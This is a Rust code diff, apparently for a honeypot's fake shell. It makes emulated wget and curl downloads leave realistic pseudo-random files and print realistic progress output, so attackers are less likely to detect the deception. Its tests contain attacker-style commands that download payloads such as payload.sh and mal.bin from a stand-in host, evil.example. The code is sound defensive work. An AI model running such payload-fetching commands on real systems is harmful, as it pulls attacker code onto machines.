@@ -52,11 +52,38 @@ fn url_parts(url: &str) -> (String, String) {
     (host.to_string(), base.to_string())
 }
 
+/// The size a fetch of `host` reports and writes. Stable per host so repeated
+/// downloads in one session stay consistent with each other.
+fn fake_size(host: &str) -> u64 {
+    1024 + (host.len() as u64 * 37 % 8192)
+}
+
+/// Body for a "downloaded" artefact. A block of identical bytes is an obvious
+/// tell to anyone who looks at what they just fetched, so the filler is
+/// deterministic pseudo-random noise — what a compressed or binary payload
+/// looks like from the outside.
+fn placeholder_bytes(url: &str, size: u64) -> Vec<u8> {
+    let mut state = url.bytes().fold(0xcbf2_9ce4_8422_2325_u64, |acc, b| {
+        (acc ^ b as u64).wrapping_mul(0x100_0000_01b3)
+    }) | 1;
+    (0..size)
+        .map(|_| {
+            state = state
+                .wrapping_mul(6364136223846793005)
+                .wrapping_add(1442695040888963407);
+            (state >> 33) as u8
+        })
+        .collect()
+}
+
 /// Create a placeholder file for a "downloaded" artefact in the cwd (or at an
 /// explicit path) so a follow-up `ls`/`cat` is consistent with the transfer.
-fn drop_file(shell: &mut Shell, dest: &str) -> String {
+/// Returns the path written and the number of bytes that actually landed —
+/// the VFS content cap can refuse the write, and the transfer must not claim
+/// bytes the attacker cannot then see in `ls -l`.
+fn drop_file(shell: &mut Shell, dest: &str, contents: Vec<u8>) -> (String, u64) {
     let path = if dest == "-" {
-        return "-".to_string();
+        return ("-".to_string(), 0);
     } else {
         dest.to_string()
     };
@@ -64,13 +91,15 @@ fn drop_file(shell: &mut Shell, dest: &str) -> String {
     let (dir, name) = crate::vfs::Vfs::split_path(&path);
     if let Some(parent) = shell.vfs.resolve(shell.cwd, dir) {
         if shell.vfs.node(parent).meta.is_dir() {
-            shell
-                .vfs
-                .add_file(parent, name, Vec::<u8>::new(), 0o644, uid, gid);
-            return shell.vfs.path_of(parent) + "/" + name;
+            let id = shell.vfs.add_file(parent, name, contents, 0o644, uid, gid);
+            let written = match &shell.vfs.node(id).kind {
+                crate::vfs::NodeKind::File { contents } => contents.len() as u64,
+                _ => 0,
+            };
+            return (shell.vfs.path_of(parent) + "/" + name, written);
         }
     }
-    path
+    (path, 0)
 }
 
 /// `wget [OPTION]... [URL]...`
@@ -113,8 +142,8 @@ pub fn wget(shell: &mut Shell, args: &[String]) -> CommandResult {
             .clone()
             .or_else(|| prefix.as_ref().map(|p| format!("{p}/{base}")))
             .unwrap_or_else(|| base.clone());
-        let written = drop_file(shell, &dest);
-        let size: u64 = 1024 + (host.len() as u64 * 37 % 8192);
+        let body = placeholder_bytes(url, fake_size(&host));
+        let (written, size) = drop_file(shell, &dest, body);
 
         shell.captures.push(Capture::Download {
             tool: "wget".into(),
@@ -189,10 +218,10 @@ pub fn curl(shell: &mut Shell, args: &[String]) -> CommandResult {
         } else {
             "-".to_string()
         };
-        let written = if dest == "-" {
-            "-".to_string()
+        let (written, size) = if dest == "-" {
+            ("-".to_string(), fake_size(&host))
         } else {
-            drop_file(shell, &dest)
+            drop_file(shell, &dest, placeholder_bytes(url, fake_size(&host)))
         };
         shell.captures.push(Capture::Download {
             tool: "curl".into(),
@@ -205,11 +234,22 @@ pub fn curl(shell: &mut Shell, args: &[String]) -> CommandResult {
             out.push_str("Server: nginx/1.22.1\r\n");
             out.push_str("Date: Fri, 03 May 2024 10:15:42 GMT\r\n");
             out.push_str("Content-Type: application/octet-stream\r\n");
-            out.push_str("Content-Length: 0\r\n");
+            out.push_str(&format!("Content-Length: {size}\r\n"));
             out.push_str("Connection: keep-alive\r\n\r\n");
         } else if !silent && dest != "-" {
-            // Progress meter for saved files; empty body so no stdout content.
-            let _ = &host;
+            // Real curl always renders this table when the body goes to a file.
+            // A small transfer completes instantly; curl then reports a rate in
+            // the hundreds of KB/s rather than a measured one.
+            let rate = format!("{}k", 300 + size % 500);
+            out.push_str(
+                "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n",
+            );
+            out.push_str(
+                "                                 Dload  Upload   Total   Spent    Left  Speed\n",
+            );
+            out.push_str(&format!(
+                "100 {size:>5}  100 {size:>5}    0     0  {rate:>5}      0 --:--:-- --:--:-- --:--:-- {rate:>5}\n"
+            ));
         }
     }
     CommandResult::ok(out)
@@ -464,6 +504,41 @@ mod tests {
         run(&mut shell, "curl -O http://evil.example/mal.bin");
         assert_eq!(shell.captures.len(), 1);
         assert!(run(&mut shell, "ls").contains("mal.bin"));
+    }
+
+    /// The transfer's reported size has to match the file it leaves behind:
+    /// "saved [1394/1394]" next to a 0-byte file is a one-command tell.
+    #[test]
+    fn downloaded_file_matches_the_reported_size() {
+        for (tool, cmd, name) in [
+            ("wget", "wget http://evil.example/payload.sh", "payload.sh"),
+            (
+                "curl",
+                "curl -O http://evil.example/payload.sh",
+                "payload.sh",
+            ),
+        ] {
+            let mut shell = Shell::new("root", "debian");
+            let out = run(&mut shell, cmd);
+            let reported = out
+                .split_whitespace()
+                .filter_map(|word| word.trim_matches(['[', ']', '/', '\'']).parse::<u64>().ok())
+                .max()
+                .unwrap_or_else(|| panic!("{tool} reported no size in:\n{out}"));
+
+            let listed = run(&mut shell, &format!("wc -c {name}"));
+            let on_disk: u64 = listed
+                .split_whitespace()
+                .next()
+                .and_then(|n| n.parse().ok())
+                .unwrap_or_else(|| panic!("{tool}: unexpected wc output {listed:?}"));
+
+            assert_eq!(
+                reported, on_disk,
+                "{tool} reported {reported} bytes but wrote {on_disk}"
+            );
+            assert!(on_disk > 0, "{tool} left an empty placeholder");
+        }
     }
 
     #[test]
